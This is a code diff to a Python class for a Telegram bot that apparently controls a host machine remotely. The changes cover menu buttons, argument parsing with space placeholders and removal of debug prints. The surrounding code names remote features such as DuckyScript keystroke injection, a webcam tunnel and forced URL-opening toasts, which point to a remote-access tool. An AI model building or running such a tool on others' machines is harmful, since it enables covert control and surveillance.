@@ -1327,7 +1327,7 @@ class PeppinoTelegram:
         self.__play_loaded_sound("breath")
 
     def browser_opening_toast(self, title: str, main_text: str, descritpion: str, url: str) -> None:
-        notify_toast(title, main_text, descritpion, on_activated=lambda: browseropen(url), on_dismissed=lambda: browseropen(url))
+        notify_toast(title, main_text, descritpion, on_activated=lambda *args: browseropen(url), on_dismissed=lambda *args: browseropen(url))
 
     def bsend(self, text: str, retries=0, parse_mode:str|None=None, reply_markup=None) -> int|None:
         if retries>3:
@@ -1611,7 +1611,7 @@ class PeppinoTelegram:
         }
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="Select a category:", close_btn_lab="mainmenu_close")
+        self.mainmenu_ref = self.new_menu(buttons, label="Select a category:", close_btn_lab="mainmenu_close", next_btn=True, next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
 
     def menu_system(self):
@@ -1777,7 +1777,7 @@ class PeppinoTelegram:
             "🦑 Plankton": "/plankton",
             "🔇 Planktonnoaudio": "/planktonnoaudio",
             "🐷 Johnpork": "/johnpork",
-            "🔔 Urlopen": "/urlopen",
+            "🔔 Urltoast": "/urltoast",
             "🔕 Johnporknoaudio": "/johnporknoaudio",
             "🛋️ Gabinetti": "/gabinetti",
             "⌨️ Duckyscript": "/duckyscript",
@@ -1837,7 +1837,8 @@ class PeppinoTelegram:
         if command.startswith("/"):
             command = args[0][1:]
         function_args = args[1:]
-        function_args = list(map(lambda x: int(x) if x.isdigit() else x, function_args))
+        function_args = map(lambda x: int(x) if x.isdigit() else x, function_args)
+        function_args = list(map(lambda x:x.replace("<SPACE>"," "), function_args))
 
         func = self.function_table.get(command)
         if func:
@@ -1848,7 +1849,6 @@ class PeppinoTelegram:
                     func(*function_args)
                 else:
                     if len(function_args) < len(function_needed_args) or len(function_args) > len(funciton_all_args):
-                        print(f"{function_needed_args=}\n{funciton_all_args=}\n{function_args}")
                         raise TypeError("Wrong number of arguments for this function")
                     if function_args:
                         thread_args = (*function_args,)
@@ -1863,7 +1863,7 @@ class PeppinoTelegram:
                     if arg == "self":
                         continue
                     response = self.send_prompt(f"Choose a {arg} for {command}")
-                    print(f"Arg: {arg} {response=}")
+                    response = response.replace(" ","<SPACE>")
                     args[arg] = response
                 self.parse_command(f"/{command} " + " ".join(args.values()))
             except Exception as e:
@@ -2460,8 +2460,7 @@ class PeppinoTelegram:
         self.user["status"]="input_requested"
         self.user["last_response"]=None
         while not self.user["last_response"]:
-            print(self.user)
-            sleep(0.5)
+            sleep(1)
         else:
             tmp = self.user["last_response"]
             self.user["last_response"]=None
@@ -2513,9 +2512,8 @@ class PeppinoTelegram:
         self.stop_webcam_tunnel()
         sys.exit()
 
-    def test(self) -> None: #this is a test command
-        response = self.send_prompt("Name: ")
-        print(f"{response=}")
+    def test(self) -> None: #this is a test command used for test purpuses
+        ...
 
     def update_commands(self) -> bool:
         self.commands = self.extract_commands()
